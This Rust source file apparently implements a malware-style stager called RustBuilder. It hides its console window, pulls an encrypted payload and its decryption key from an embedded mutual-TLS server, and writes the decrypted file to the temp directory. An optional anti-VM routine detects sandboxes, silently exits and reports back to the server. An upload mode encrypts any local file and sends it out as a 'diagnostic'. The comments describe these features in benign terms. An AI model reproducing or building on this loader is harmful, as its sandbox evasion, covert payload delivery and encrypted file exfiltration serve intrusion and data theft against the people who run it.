#![cfg_attr(windows, windows_subsystem = "windows")]

use std::fs::File;
use std::io::{BufWriter, Read, Write};
use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{bail, Context, Result};
use clap::Parser;
use common::pgp;
use common::proto::{KeyResponse, UploadResponse};
use reqwest::blocking::{Body, Client};
use reqwest::{Certificate, Identity};

// This file is generated at build time and embeds the server URL, build ID,
// and certificate material needed by the client to talk to the backend.
include!(concat!(env!("OUT_DIR"), "/config.rs"));

fn normalize_error_message(message: &str) -> String {
    let lowered = message.to_ascii_lowercase();
    if lowered.contains("recusou ativamente") || lowered.contains("connection refused") {
        return "connection refused: check that the server is running and the configured URL matches the listener address.".to_string();
    }
    message.to_string()
}

fn debug_log(message: impl AsRef<str>) {
    if !DEBUG_BUILD {
        return;
    }

    let Some(home) = std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME")) else {
        return;
    };
    let log_dir = PathBuf::from(home).join("Desktop").join("RustBuilder-debug");
    if std::fs::create_dir_all(&log_dir).is_err() {
        return;
    }
    let log_path = log_dir.join("client.log");
    let line = format!("{} {}\n", chrono_like_timestamp(), normalize_error_message(message.as_ref()));
    if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
        let _ = file.write_all(line.as_bytes());
    }
}

fn chrono_like_timestamp() -> String {
    match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(value) => format!("unix:{}", value.as_secs()),
        Err(_) => "unix:unknown".to_string(),
    }
}

// CLI arguments for the client.
// --out: where to save a downloaded artifact after decrypting it.
// --upload: path of a diagnostic file to encrypt and send back to the server.
// --server and --build_id are used to target the correct build and endpoint.
#[derive(Parser)]
#[command(name = "client")]
struct Args {
    #[arg(long)]
    out: Option<PathBuf>,

    #[arg(long)]
    upload: Option<PathBuf>,

    #[arg(long, default_value = SERVER_URL)]
    server: String,

    #[arg(long, default_value = BUILD_ID)]
    build_id: String,
}

// Optional VM escape protection for Windows builds when the anti-VM feature is enabled.
// It tries to detect sandboxed execution environments before continuing.
#[cfg(all(windows, feature = "antivm"))]
fn vm_protection(client: &Client, args: &Args) {
    let pub_armored = match std::str::from_utf8(PUB_KEY) {
        Ok(key) if !key.trim().is_empty() => key.to_owned(),
        _ => {
            debug_log("anti-VM blocked execution: no upload key is embedded");
            std::process::exit(0);
        }
    };

    let server = args.server.clone();
    let build_id = args.build_id.clone();
    let client = client.clone();
    let log_path = std::env::temp_dir().join(format!(
        "rustbuilder-antivm-{}.log",
        std::process::id()
    ));
    let success_build_id = build_id.clone();
    let success_server = server.clone();

    antivm::ProtectionBuilder::new()
        .set_vm(true)
        .set_ip(false)
        .set_http(false)
        .set_network(false)
        .set_screen(false)
        .set_cpu(false)
        .set_ram(false)
        .filtered(move || {
            let log = format!(
                "anti-VM detected\nprocess termination reason: anti-VM filter matched\nbuild_id={build_id}\npid={}\nserver={server}\n",
                std::process::id()
            );

            debug_log(&log);

            let result = std::fs::write(&log_path, log.as_bytes())
                .and_then(|_| {
                    upload_diagnostic(
                        &client,
                        &server,
                        &build_id,
                        &pub_armored,
                        &log_path,
                    )
                    .map(|_| ())
                    .map_err(std::io::Error::other)
                });

            if let Err(error) = result {
                debug_log(format!("failed to upload anti-VM log: {error}"));
            }
            let _ = std::fs::remove_file(&log_path);
            std::process::exit(0);
        })
        .init();

    debug_log(format!(
        "anti-VM check completed: no virtual machine indicators detected; process continues\nbuild_id={success_build_id}\npid={}\nserver={success_server}",
        std::process::id()
    ));
}

// Builds the authenticated HTTP client used for all requests.
// This loads the embedded certificate authority and client identity, then configures
// rustls and a global timeout for the network layer.
fn build_client() -> Result<Client> {
    debug_log("initializing TLS client: loading embedded CA certificate and mTLS identity");
    let ca = Certificate::from_pem(CA_CERT).context("failed to load embedded ca certificate")?;
    let identity =
        Identity::from_pem(CLIENT_IDENTITY).context("failed to load embedded client identity")?;

    let client = Client::builder()
        .use_rustls_tls()
        .add_root_certificate(ca)
        .identity(identity)
        .timeout(Duration::from_secs(120))
        .build()
        .context("failed to build http client")?;

    debug_log(format!(
        "TLS client ready; mTLS identity loaded and connection timeout set to {} seconds",
        120
    ));
    Ok(client)
}

// Downloads the encrypted artifact for a specific build and writes it to a temporary file.
// The artifact stream is read in chunks to avoid loading the full file into memory.
fn download_artifact(client: &Client, server: &str, build_id: &str, tmp: &Path) -> Result<()> {
    let url = format!("{server}/builds/{build_id}/artifact");
    debug_log(format!("starting artifact download connection: {url}"));
    let mut response = client
        .get(&url)
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    debug_log(format!("artifact download response status: {}", response.status()));
    if !response.status().is_success() {
        bail!("artifact request failed with status {}", response.status());
    }

    let file = File::create(tmp)
        .with_context(|| format!("failed to create temp file {}", tmp.display()))?;
    let mut writer = BufWriter::new(file);

    let mut buf = vec![0u8; 64 * 1024];
    loop {
        let n = response
            .read(&mut buf)
            .context("failed to read artifact chunk")?;
        if n == 0 {
            break;
        }
        writer
            .write_all(&buf[..n])
            .with_context(|| format!("failed to write chunk to {}", tmp.display()))?;
    }
    writer
        .flush()
        .with_context(|| format!("failed to flush {}", tmp.display()))?;
    Ok(())
}

// Requests the private key metadata needed to decrypt the downloaded artifact.
// The server returns the armored private key and its passphrase in a JSON structure.
fn fetch_key(client: &Client, server: &str, build_id: &str) -> Result<KeyResponse> {
    let url = format!("{server}/builds/{build_id}/key");
    debug_log(format!("starting key fetch connection: {url}"));
    let response = client
        .get(&url)
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    debug_log(format!("key fetch response status: {}", response.status()));
    if !response.status().is_success() {
        bail!("key request failed with status {}", response.status());
    }
    response.json::<KeyResponse>().context("failed to parse key response")
}

// Builds a temporary filename beside the final output path.
// This is a safe staging file used while the artifact is being downloaded or decrypted.
fn tmp_path_for(out: &Path) -> PathBuf {
    match out.file_name().and_then(|n| n.to_str()) {
        Some(name) => out.with_file_name(format!("{name}.part")),
        None => out.with_file_name("download.part"),
    }
}

fn default_output_path(build_id: &str) -> PathBuf {
    std::env::temp_dir().join(format!("rustbuilder-{build_id}.bin"))
}

fn ensure_output_directory(out: &Path) -> Result<()> {
    if let Some(parent) = out.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .with_context(|| format!("failed to create output directory {}", parent.display()))?;
        }
    }
    Ok(())
}

// Encrypts the diagnostic content using the server's public key.
// This ensures the uploaded report is protected before being sent over the network.
fn encrypt_diagnostic(pub_armored: &str, plaintext: &[u8]) -> Result<Vec<u8>> {
    pgp::encrypt_to_public(plaintext, pub_armored)
}

// Encrypts a local diagnostic file and sends it to the backend.
// The data is written to a temporary encrypted file so the upload can be posted as a stream.
fn upload_diagnostic(
    client: &Client,
    server: &str,
    build_id: &str,
    pub_armored: &str,
    file: &Path,
) -> Result<UploadResponse> {
    let plaintext = std::fs::read(file)
        .with_context(|| format!("failed to read diagnostic file {}", file.display()))?;
    let ciphertext = encrypt_diagnostic(pub_armored, &plaintext)?;

    let tmp = tmp_path_for(file);
    std::fs::write(&tmp, &ciphertext)
        .with_context(|| format!("failed to write temp file {}", tmp.display()))?;

    let result = send_diagnostic(client, server, build_id, file, &tmp);
    let _ = std::fs::remove_file(&tmp);
    result
}

// Sends the encrypted diagnostic payload to the server with the original filename in a header.
// The server can reconstruct the artifact name while still receiving the encrypted bytes.
fn send_diagnostic(
    client: &Client,
    server: &str,
    build_id: &str,
    file: &Path,
    tmp: &Path,
) -> Result<UploadResponse> {
    let filename = file
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("diagnostic");
    let url = format!("{server}/builds/{build_id}/diagnostics");
    debug_log(format!("starting diagnostic upload connection: {url}"));

    let upload =
        File::open(tmp).with_context(|| format!("failed to open temp file {}", tmp.display()))?;

    let response = client
        .post(&url)
        .header("X-Diagnostic-Filename", filename)
        .header(reqwest::header::CONTENT_TYPE, "application/octet-stream")
        .body(Body::new(upload))
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    debug_log(format!("diagnostic upload response status: {}", response.status()));
    if !response.status().is_success() {
        bail!("diagnostic upload failed with status {}", response.status());
    }
    response
        .json::<UploadResponse>()
        .context("failed to parse upload response")
}

// Orchestrates the full download-and-decrypt flow.
// It retrieves the artifact, fetches the key, decrypts the payload, and writes the final file.
fn run(client: &Client, args: &Args, out: &Path, tmp: &Path) -> Result<()> {
    download_artifact(client, &args.server, &args.build_id, tmp)?;

    let ciphertext = std::fs::read(tmp)
        .with_context(|| format!("failed to read temp file {}", tmp.display()))?;
    let key = fetch_key(client, &args.server, &args.build_id)?;

    let plaintext = pgp::decrypt(&ciphertext, &key.priv_armored, &key.passphrase)?;

    std::fs::write(out, &plaintext).with_context(|| format!("failed to write {}", out.display()))?;
    Ok(())
}

// Application entry point.
// It activates VM protection on Windows when configured, parses CLI options,
// and chooses between uploading a diagnostic file or downloading/decrypting an artifact.
fn run_client() -> Result<()> {
    let args = Args::parse();
    debug_log(format!("started build_id={} server={}", args.build_id, args.server));
    let client = build_client()?;

    #[cfg(all(windows, feature = "antivm"))]
    vm_protection(&client, &args);

    if let Some(file) = &args.upload {
        let pub_armored = std::str::from_utf8(PUB_KEY)
            .context("embedded build public key is not valid utf-8")?;
        if pub_armored.trim().is_empty() {
            bail!("no build public key embedded in this client (standalone dev build?)");
        }
        let resp = upload_diagnostic(&client, &args.server, &args.build_id, pub_armored, file)?;
        debug_log(format!("diagnostic uploaded file={}", file.display()));
        debug_log(format!(
            "diagnostic uploaded: {} ({} encrypted bytes) for {}",
            resp.filename, resp.bytes, resp.build_id
        ));
        return Ok(());
    }

    let out = args
        .out
        .clone()
        .unwrap_or_else(|| default_output_path(&args.build_id));

    ensure_output_directory(&out)?;
    let tmp = tmp_path_for(&out);
    let result = run(&client, &args, &out, &tmp);
    let _ = std::fs::remove_file(&tmp);
    if let Err(error) = &result {
        debug_log(format!("download failed: {}", normalize_error_message(&format!("{error:#}"))));
    }
    result?;

    debug_log(format!("decrypted file written to {}", out.display()));
    Ok(())
}

fn main() {
    if let Err(error) = run_client() {
        debug_log(format!("fatal error: {}", normalize_error_message(&format!("{error:#}"))));
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::normalize_error_message;

    #[test]
    fn normalizes_portuguese_connection_errors_to_english() {
        let input = "connect error: tcp connect error: Nenhuma conexão pôde ser feita porque a máquina de destino as recusou ativamente. (os error 10061)";
        let output = normalize_error_message(input);

        assert!(output.contains("connection refused"));
        assert!(output.contains("server is running"));
        assert!(!output.contains("Nenhuma conexão"));
    }

    #[test]
    fn keeps_english_messages_stable() {
        let input = "error sending request for url (https://localhost:8443/builds/build-123/artifact): client error (Connect): tcp connect error: Connection refused";
        let output = normalize_error_message(input);

        assert!(output.contains("connection refused"));
        assert!(output.contains("server is running"));
    }
}
